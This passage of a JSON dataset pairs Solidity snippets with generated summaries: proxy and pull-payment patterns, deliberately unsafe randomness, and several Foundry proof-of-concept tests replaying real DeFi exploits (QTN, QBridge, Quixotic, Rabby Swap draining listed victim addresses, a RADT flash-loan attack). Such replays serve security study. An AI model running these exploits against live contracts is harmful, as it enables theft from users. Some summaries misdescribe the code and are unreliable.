call\u6210\u529f\uff0c\u8fd4\u56demem\u8d77\u59cb\u4f4d\u7f6e\u4e3a0\uff0c\u957f\u5ea6\u4e3areturndatasize()\u7684\u6570\u636e\uff08\u683c\u5f0f\u4e3abytes\uff09\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n}\n\n/**\n * @dev \u903b\u8f91\u5408\u7ea6\uff0c\u6267\u884c\u88ab\u59d4\u6258\u7684\u8c03\u7528\n */\ncontract Logic {\n    address public implementation; // \u4e0eProxy\u4fdd\u6301\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    uint public x = 99; \n    event CallSuccess();\n\n    // \u8fd9\u4e2a\u51fd\u6570\u4f1a\u91ca\u653eLogicCalled\u5e76\u8fd4\u56de\u4e00\u4e2auint\u3002\n    // \u51fd\u6570selector: 0xd09de08a\n    function increment() external returns(uint) {\n        emit CallSuccess();\n        return x + 1;\n    }\n}\n\n/**\n * @dev Caller\u5408\u7ea6\uff0c\u8c03\u7528\u4ee3\u7406\u5408\u7ea6\uff0c\u5e76\u83b7\u53d6\u6267\u884c\u7ed3\u679c\n */\ncontract Caller{\n    address public proxy; // \u4ee3\u7406\u5408\u7ea6\u5730\u5740\n\n    constructor(address proxy_){\n        proxy = proxy_;\n    }\n\n    // \u901a\u8fc7\u4ee3\u7406\u5408\u7ea6\u8c03\u7528 increase()\u51fd\u6570\n    function increase() external returns(uint) {\n        ( , bytes memory data) = proxy.call(abi.encodeWithSignature(\"increment()\"));\n        return abi.decode(data,(uint));\n    }\n}\n",
        "summary": "This code includes three contracts: Proxy, Logic, and Caller. The Proxy contract utilizes a delegatecall opcode to delegate all calls to a Logic contract. The Logic contract has a function that increments a public variable and emits an event. The Caller contract calls the increment function through the Proxy contract and returns the result.",
        "id": "40f1da0c-8697-4784-bb8d-395beb6e9e8d"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.21;\n\ncontract Proxy {\n\n    address delegate;\n    address owner = msg.sender;\n\n    function upgradeDelegate(address newDelegateAddress) public {\n        require(msg.sender == owner);\n        delegate = newDelegateAddress;\n    }\n\n    function() external payable {\n        assembly {\n            let _target := sload(0)\n            calldatacopy(0x0, 0x0, calldatasize)\n            let result := delegatecall(gas, _target, 0x0, calldatasize, 0x0, 0)\n            returndatacopy(0x0, 0x0, returndatasize)\n            switch result case 0 {revert(0, 0)} default {return (0, returndatasize)}\n        }\n    }\n}\n",
        "summary": "This is a smart contract written in Solidity programming language that acts as a proxy for other contracts. The contract allows the owner to upgrade the delegate contract that handles all the calls forwarded to the proxy. When a user sends a transaction to the contract, the fallback function is called and uses the assembly code to delegate the call to the delegate contract and forward any data and value provided by the user. The contract is marked as experimental and requires further auditing to ensure its safety and correctness.",
        "id": "213c9068-a9fa-435c-aa3e-8e6c794c65de"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.21;\n\ncontract PullOverPush {\n\n    mapping(address => uint) credits;\n\n    function allowForPull(address receiver, uint amount) private {\n        credits[receiver] += amount;\n    }\n\n    function withdrawCredits() public {\n        uint amount = credits[msg.sender];\n\n        require(amount != 0);\n        require(address(this).balance >= amount);\n\n        credits[msg.sender] = 0;\n\n        msg.sender.transfer(amount);\n    }\n}\n",
        "summary": "This is a Solidity smart contract named \"PullOverPush\". It has a mapping named `credits` that associates an amount of credit with each address. \n\nThe function `allowForPull` is internal, which means it can only be called from within the contract. It allows a person or contract with the specified address (receiver) to pull the specified amount of Ether from the contract. \n\nThe function `withdrawCredits` allows a person to withdraw their credited Ether from the contract. It checks that the caller has some credits to withdraw and that the contract balance is at least the amount they are trying to withdraw. It then sets the caller's credit to zero and transfers the Ether to their address.\n\nNote: There is a disclaimer in the code that it has not been professionally audited, hence it is advised to use it at your own risk.",
        "id": "5fa232c2-cae5-4c21-8a56-e1f970111125"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1615625901739511809\n// @TX\n// https://etherscan.io/tx/0x37cb8626e45f0749296ef080acb218e5ccc7efb2ae4d39c952566dc378ca1c4c\n// https://etherscan.io/tx/0xfde10ad92566f369b23ed5135289630b7a6453887c77088794552c2a3d1ce8b7\n\ncontract QTNContract {\n    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);\n\n    function transferBack() external {\n        QTN.transfer(msg.sender, QTN.balanceOf(address(this)));\n    }\n}\n\ncontract ContractTest is DSTest {\n    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA8208dA95869060cfD40a23eb11F2158639c829B);\n    address[] contractList;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16430212);\n        cheats.label(address(QTN), \"QTN\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Pair), \"Pair\");\n    }\n\n    function testExploit() public {\n        address(WETH).call{value: 2 ether}(\"\");\n        WETHToQTN();\n        cheats.warp(block.timestamp + 500); // _timeLimitFromLastBuy 5 minutes\n        QTNContractFactory();\n        cheats.warp(block.timestamp + 500);\n        QTNContractBack();\n        QTNToWETH();\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n            );\n    }\n\n    function QTNContractFactory() internal {\n        uint256 transferAmount = QTN.balanceOf(address(this)) / 40;\n        for (uint256 i; i < 40; ++i) {\n            QTNContract QTNcontract = new QTNContract();\n            contractList.push(address(QTNcontract));\n            QTN.transfer(address(Pair), transferAmount);\n            Pair.skim(address(QTNcontract));\n        }\n    }\n\n    function QTNContractBack() internal {\n        for (uint256 i; i < 40; ++i) {\n            contractList[i].call(abi.encodeWithSignature(\"transferBack()\"));\n        }\n    }\n\n    function WETHToQTN() internal {\n        WETH.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(QTN);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n    function QTNToWETH() internal {\n        QTN.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(QTN);\n        path[1] = address(WETH);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            QTN.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n}\n",
        "summary": "This code is a test contract that exploits a vulnerability in a smart contract in order to steal funds. The test creates a large number of new contracts, each of which holds a very small amount of a particular token. The test then calls a function in the vulnerable smart contract that transfers the tokens held by these small contracts back to the test contract. Finally, the test exchanges these tokens for a different token and sends them to the attacker's address.",
        "id": "2472e610-e403-43e6-bd04-fbef7bedb57d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IQBridge {\n  function deposit(uint8 destinationDomainID, bytes32 resourceID, bytes calldata data) external payable;\n}\ninterface IQBridgeHandler {\n  // mapping(address => bool) public contractWhitelist;\n  function resourceIDToTokenContractAddress(bytes32) external returns (address);\n  function contractWhitelist(address) external returns (bool);\n  function deposit(bytes32 resourceID, address depositer, bytes calldata data) external;\n}\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  address attacker = 0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7;\n  address QBridge = 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6;\n  address QBridgeHandler = 0x17B7163cf1Dbd286E262ddc68b553D899B93f526;\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14090169); //fork mainnet at block 14090169\n  }\n\n  function testExploit() public {\n    cheat.startPrank(attacker);\n    // emit log_named_uint(\n    //   \"Before exploiting, attacker OP Balance:\",\n    //   op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)\n    // );\n    bytes32 resourceID = hex\"00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01\";\n    bytes memory data = hex\"000000000000000000000000000000000000000000000000000000000000006900000000000000000000000000000000000000000000000a4cc799563c380000000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7\";\n    uint option;\n    uint amount;\n    (option, amount) = abi.decode(data, (uint, uint));\n    emit log_named_uint(\"option\", option);\n    emit log_named_uint(\"amount\", amount);\n    // which calls in turn:\n    // IQBridgeHandler(QBridgeHandler).deposit(resourceID, attacker, data);\n    emit log_named_address(\"contractAddress\", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID));\n    emit log_named_uint(\"is 0 address whitelisted\", IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0)) ? 1 : 0);\n\n    IQBridge(QBridge).deposit(1, resourceID, data);\n\n    // cheats.createSelectFork(\"bsc\", 14742311); //fork mainnet at block 14742311\n\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that defines a test function `testExploit()`. The function exploits a vulnerability in the `deposit()` function of `IQBridge`, a smart contract interface specified by the `interface.sol` file. This is accomplished by calling `IQBridge(QBridge).deposit(1, resourceID, data);`. The specific exploit is not described in the code.",
        "id": "b8dfc523-c692-4b99-a67b-22dcc83c7902"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface Quixotic {\n  function fillSellOrder(\n    address seller,\n    address contractAddress,\n    uint256 tokenId,\n    uint256 startTime,\n    uint256 expiration,\n    uint256 price,\n    uint256 quantity,\n    uint256 createdAtBlockNumber,\n    address paymentERC20,\n    bytes memory signature,\n    address buyer\n  ) external payable;\n}\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IERC20 op = IERC20(0x4200000000000000000000000000000000000042);\n  Quixotic quixotic = Quixotic(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"optimism\", 13591383); //fork optimism at block 13591383\n  }\n\n  function testExploit() public {\n    cheat.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);\n    emit log_named_uint(\n      \"Before exploiting, attacker OP Balance:\",\n      op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)\n    );\n    quixotic.fillSellOrder(\n      0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,\n      0xbe81eabDBD437CbA43E4c1c330C63022772C2520,\n      1,\n      0,\n      115792089237316195423570985008687907853269984665640564039457584007913129639934,\n      2736191871050436050944,\n      1,\n      115792089237316195423570985008687907853269984665640564039457584007913129639934,\n      0x4200000000000000000000000000000000000042,\n      hex\"28bc2ff1634b13821eac466ef6875c44f1f556d00d3cafce02da07b217da395131294339d96a01922b83f8e3c67e74652198b3a6db79d7ddd48807b9ec6ae0491c\",\n      0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B\n    );\n    emit log_named_uint(\n      \"After exploiting, attacker OP Balance:\",\n      op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)\n    );\n\n    //issues was only check seller signature\n    //require(_validateSellerSignature(sellOrder, signature),\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that imports several other contracts/interfaces and defines a single function called `testExploit`. Within this function, the contract calls the `fillSellOrder` function of the `Quixotic` interface, passing in a set of arguments as parameters. The purpose of this function call and its parameters is not clear without further context. The contract also emits two `log_named_uint` events before and after the function call to print the `op` balance of a specific address (`0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5`) at two different points in time. Additionally, the `setUp` function is defined, which creates a fork of the \"optimism\" network at a specific block number. The `receive` function is also defined to allow the contract to receive incoming transactions.",
        "id": "e5457cf3-fb5b-46dd-a52d-61be92f609d5"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~200,000 US$\n// Root cause : Classic arbitrary external call vulnerability\n// Multiple tokens has been stolen, and 114 ETH deposited to Tornado Cash\n// Attacker : 0xb687550842a24d7fbc6aad238fd7e0687ed59d55\n// Attack Contract : 0x9682f31b3f572988f93c2b8382586ca26a866475\n// Vulnerable Contract : 0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1 and these: https://twitter.com/Rabby_io/status/1579833969566449666\n// Attack Txs : \n//      0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26\n//      0xa02c180149ce03d1b6e3d412585000b968b7db59a277717ec51d0899c1a3c017\n//      0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26\n//      0xf1c1066c259672396b8f242311a9f1c83bfa52c27529d713d80a3da93047c37f\n//      0x53835af1b7df33435188d2380328b81c0e8a22b01353c76e3dac352275895b45\n//      0x322592750691798488006a26aa042b55ab9d7637f9b0adc42089a4c480e51870\n//      0xce0935010baf445e300d4d600caac7fc1fecb5ccb092cdbef57904aa7e5408b2\n//      0x366df0c20e00666749b16ae00475b3c41834dc659ebb29e059aa9bffa892c038\n//      0x9fac5412eb42aab07dcb2c5fbb03669aaa98d9c57849d44d8291d3156d9f4871\n//      0xff1f352912666796d5cd51b5dfa3e6319544aeb5938e1e9f310fd5fcb02be6da\n//      0x84156ea5360b679dfa7cdda80c16aafbfdf1ba20b84bcf76f79666f0c405b86f\n//      0xc10ec615e2d18c8a7dad2bb2418c422472565d9622ed851298fc848c3a451387\n//      0x7cefbfd14497b1c577423d94ea521615991eee2590fab980230d9dd1d80ccf1c\n//      0x8bcac5e570aa695b5e0ce7dd58766eaa5830f44bbef5008aef63c6efb036e717\n//      0xb3af75f703ddc5d15ff872585b7d970c5204b90399a5859ec39e736a2ffbf375\n//      0x708ffcf4a76bd159056afb17ce6c5f5adcb5899e465bbf038aae79c3cef666ae\n//      0xca53e107a9a21d8f431614570a98c4718cca7172415e3fbed8842d426ac3ab54\n//      0x5bbab18059f8c3fec56a0ddcd15feddf7cda8b8007b254436956db1d9ffe72ec\n//      0x6899b8caee16dbd75359cabcd24e32b2362c474cdf39ea810cf4386018761beb\n//      0x07887fffc4488354d813fdcca5da0586dd6f9a3da36d503af768302eacbeec41\n// Reproduce Tx: Steal USDC - 0x914c1ae4f03657064f0b1d5ddc6e06f39e82bce6fb2f726efdca52c092fbfc26\n//\n// @Analysis\n// Supremacy Inc. : https://twitter.com/Supremacy_CA/status/1579813933669486592\n// SlowMist : https://twitter.com/SlowMist_Team/status/1579839744128978945\n// Beosin Alert : https://twitter.com/BeosinAlert/status/1579856733178331139\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant attacker = 0xb687550842a24D7FBC6Aad238fd7E0687eD59d55;\naddress constant RabbySwapRouter = 0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1;\naddress constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\naddress constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\ncontract Attacker is Test {\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15724451);\n        cheat.label(attacker, \"attacker\");\n        cheat.label(RabbySwapRouter, \"RabbySwapRouter\");\n        cheat.label(usdt, \"USDT\");\n        cheat.label(usdc, \"USDC\");\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"[Before] Attacker's USDC Balance:\", IERC20(usdc).balanceOf(address(this)), 6);\n\n        // Somehow attacker got these EOA addresses that are approved the Rabby Wallet Swap Router contract.\n        // ...Maybe the attacker grep the history Txs and find those victims that interacted with the Swap Router contract.\n        address[29] memory victims = [\n            0x94228872bb16CBCDfe010c42a8e456d15B366bF1,\n            0x6a3BCee1eBeBDaA099a46d21a355D0FF1C521fCB,\n            0xDAcCce559a0571083556f39d05b177579613D83b,\n            0x720610ed4925676D971B0ae5b3080bd233E19038,\n            0xf9e1D1e9F22c96752356AdFd377231528c7E851E,\n            0xAF22b1692dEe5929952cFBA4D9a74c0952C712C8,\n            0xFcdB212E7e7588D2dd2cc44C30F6C79fB507DB4B,\n            0x9A93C5f7680724F6b7097085B0052A56D80615Bd,\n            0x491968b05D95979BA3a52D73D8a39EA96693f011,\n            0xc64284527B04A48c6673dF62f5B48188Ccfdf658,\n            0x9df99a08710615FaBcb16Ea0b05ED039e8a5F644,\n            0xc897967Bab363caDD4F3001d51506bCc5DD6f6C2,\n            0x48aa9d67cb713804C005516BCa7769c159d7897C,\n            0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3,\n            0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f,\n            0x73B37009778048f6dB88fD602582473e74e5019a,\n            0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb,\n            0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf,\n            0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7,\n            0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85,\n            0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b,\n            0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4,\n            0xd38023D7Ee559672fA00eA5156734710bcc0e781,\n            0x059c1592696D430E7bA8cccC984BA9639b8CF90B,\n            0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325,\n            0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110,\n            0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc,\n            0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6,\n            0x1Fc550e98aD3021e32C47A84019F77a0792c60B7\n        ];\n\n        for(uint i; i < victims.length; ++i){\n            // Step1: Check the victim allowance\n            uint256 vic_balance = IERC20(usdc).balanceOf(victims[i]);\n            uint256 vic_allowance = IERC20(usdc).allowance(victims[i], RabbySwapRouter);\n\n            // Step2: If allowance >= balance: exploit!\n            if (vic_allowance >= vic_balance) {\n                // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.\n                bytes memory usdc_callbackData = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), vic_balance);\n                IRabbySwap(RabbySwapRouter).swap(usdt, 0, address(this), 4660, usdc, usdc, usdc_callbackData, block.timestamp);\n            }\n        }\n\n        emit log_named_decimal_uint(\"[After] Attacker's USDC Balance:\", IERC20(usdc).balanceOf(address(this)), 6);\n    }\n\n    function balanceOf(address) external view returns (uint256) {\n        return 100e18;\n    }\n\n    function transfer(address, uint256) external view returns (bool) {\n        return true;\n    }\n\n    receive() external payable {}\n}\n\n\n/* -------------------- Interface -------------------- */\ninterface IRabbySwap {\n    function swap(address srcToken, uint256 amount, address dstToken, uint256 minReturn, address dexRouter, address dexSpender, bytes memory data, uint256 deadline) external;\n}",
        "summary": "This code defines a Solidity contract called \"Attacker\" which exploits a vulnerability in the RabbySwapRouter contract and steals USDC tokens from multiple victim addresses by tricking the contract into thinking that the attacker has been approved to transfer the USDC tokens. The stolen USDC tokens are then swapped for USDT tokens using the RabbySwapRouter contract, and the USDT tokens are transferred to the attacker's address. The contract also includes information about the attack, such as the addresses of the attacker and the vulnerable contract, and the transaction hashes of the stolen and exploited transactions.",
        "id": "d50ed7c5-6b93-4e7e-954a-23dbddfa9265"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IWRAP{\n    function withdraw(address from,address to,uint256 amount) external;\n}\n\ninterface IDODO {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external;\n\n    function _BASE_TOKEN_() external view returns (address);\n}\n\ncontract ContractTest is DSTest{\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);\n    Uni_Pair_V2 pair = Uni_Pair_V2(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);\n    IWRAP wrap = IWRAP(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);\n    address constant dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21572418);\n    }\n\n   \n\n    function testExploit() public{\n\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n        USDT.approve(address(Router), ~uint256(0));\n        RADT.approve(address(Router), ~uint256(0));\n        IDODO(dodo).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        buyRADT();\n        USDT.transfer(address(pair), 1);\n        uint256 amount = RADT.balanceOf(address(pair)) * 100 / 9;\n        wrap.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);\n        pair.sync();\n        sellRADT();\n        USDT.transfer(address(dodo), 200_000 * 1e18);\n    }\n\n    function buyRADT() public{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(RADT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            1_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function sellRADT() public{\n        address [] memory path = new address[](2);\n        path[0] = address(RADT);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            RADT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}",
        "summary": "This is a Solidity smart contract that attempts to exploit a vulnerability in the DODO decentralized exchange flash loan function. The contract imports and uses several external contracts and interfaces, including the UniSwap V2 Router and Pair contracts, the DODO exchange contracts, and the CheatCodes contract. \n\nThe `setUp` function sets up a fork for the Binance Smart Chain with a specific block number.\n\nThe `testExploit` function attempts to call the `flashLoan` function on the DODO exchange contract with specific parameters, and then logs the attacker's USDT balance before and after the exploit transaction. \n\nThe contract also includes several internal functions (`buyRADT`, `sellRADT`, and `DPPFlashLoanCall`) that are called by the `testExploit` function and perform various actions, such as swapping USDT for RADT and triggering a flash loan.",
        "id": "c660af87-6ca2-4189-acff-97722e3f4226"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Random {\n\n    function unsafeBlockRandom() \n        public\n        returns (uint) {\n        return uint(block.blockhash(block.number-1)) % 100;\n    }\n    \n    uint private _baseIncrement;\n    \n    function unsafeIncrementRandom() \n        public\n        returns (uint) {\n        return uint(sha3(_baseIncrement++)) % 100;\n    }\n\n}",
        "summary": "This is a Solidity smart contract that contains two functions for generating random numbers between 0 and 99. \n\nThe first function, `unsafeBlockRandom`, generates a random number by using the previous block's hash value and performing a modulo operation on it with 100. This method is considered unsafe and not recommended for serious use cases. \n\nThe second function, `unsafeIncrementRandom`, generates a random number by hashing an incrementing `_baseIncrement` value with the sha3 algorithm and taking the modulo of it with 100. This method is also not guaranteed to produce truly random numbers and is considered unsafe.",
        "id": "6b9730aa-5c81-4225-992f-92e84625b86d"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.22;\n\ncontract Randomness {\n\n    bytes32 sealedSeed;\n    bool seedSet = false;\n    bool betsClosed = false;\n    uint storedBlockNumber;\n    address trustedParty = 0xdCad3a6d3569DF655070DEd06cb7A1b2Ccd1D3AF;\n\n    function setSealedSeed(bytes32 _sealedSeed) public {\n        require(!seedSet);\n        require (msg.sender == trustedParty);\n        betsClosed = true;\n        sealedSeed = _sealedSeed;\n        storedBlockNumber = block.number + 1;\n        seedSet = true;\n    }\n\n    function bet() public {\n        require(!betsClosed);\n        // Make bets here\n    }\n\n    function reveal(bytes32 _seed) public {\n        require(seedSet);\n        require(betsClosed);\n        require(storedBlockNumber < block.number);\n        require(keccak256(msg.sender, _seed) == sealedSeed);\n        uint random = uint(keccak256(_seed, blockhash(storedBlockNumber)));\n        // Insert logic for usage of random number here;\n        seedSet = false;\n        betsClosed = false;\n    }\n}\n",
        "summary": "This code is a smart contract called \"Randomness\" that allows a trusted third party (identified by their Ethereum address) to set a sealed seed. After the seed is set, users can make bets using the \"bet\" function. Once the bets are closed, users can reveal their seed using the \"reveal\" function. This function verifies that the stored seed matches the hash of the user's submitted seed and Ethereum address. If the stored seed matches, a random number is generated using the user's seed and the block hash at the stored block number. This random number can be used for further logic within the contract.",
        "id": "a0180adf-18a4-4bef-80d5-35718bfca82f"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n    Attack tx: https://etherscan.com/tx/0x171072422efb5cd461546bfe986017d9b5aa427ff1c07ebe8acc064b13a7b7be\n    Tenderly.co: https://dashboard.tenderly.co/tx/mainnet/0x171072422efb5cd461546bfe986017d9b5aa427ff1c07ebe8acc064b13a7b7be/\n    Debug transaction: https://phalcon.blocksec.com/tx/eth/0x171072422efb5cd461546bfe986017d9b5aa427ff1c07ebe8acc064b13a7b7be\n    \n    run: forge test --contracts ./src/test/RariCapital_exp.sol -vvv  \n\n*/\ninterface Bank {\n    function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data)\n    external payable;\n}\n\ncontract ContractTest is DSTest {\n  Bank vault = Bank(0x67B66C99D3Eb37Fa76Aa3Ed1ff33E8e39F0b9c7A);\n  IERC20 fakeToken  = IERC20(payable(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46));\n  address attacker = address(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 12394009); //fork bsc at block 12394009 \n  }\n\n  function testExploit() public {\n    emit log_named_decimal_uint(\n            \"[Start] ETH Balance of attacker\",\n            attacker.balance,\n            18\n        );\n\n    bytes memory data = hex\"00000000000000000000000081796c4602b82054a727527cd16119807b8c7608000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681d82cccd1a4bd5b4d5d4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n    \n    cheats.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);\n    (bool success, bytes memory result) = address(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46).call{value: 1031000000000000000000}(\n      abi.encodeWithSignature(\"donate()\")\n    );\n\n    vault.work{value: 100000000}(0, \n              0x9EED7274Ea4b614ACC217e46727d377f7e6F9b24, \n              0, \n              100000000000000000000000, \n              data\n    );\n\n    emit log_named_decimal_uint(\n            \"[End] ETH Balance of attacker\",\n            attacker.balance,\n            18\n        );\n  }\n}",
        "summary": "This code is a Solidity smart contract that contains a test function `testExploit()`. The test function demonstrates a potential exploit on a bank smart contract interface (`Bank`) specified in the `interface.sol` file. The exploit involves sending ETH to a fake token contract (`IERC20`) and calling the bank's `work()` function with some payload data. The `setUp()` function is used to set up the test environment for the exploit. The code also imports the `forge-std/Test.sol` library and defines an `address` for the attacker.",
        "id": "6cc9872c-6355-43b4-aad3-ad76daea1200"
    },
    {
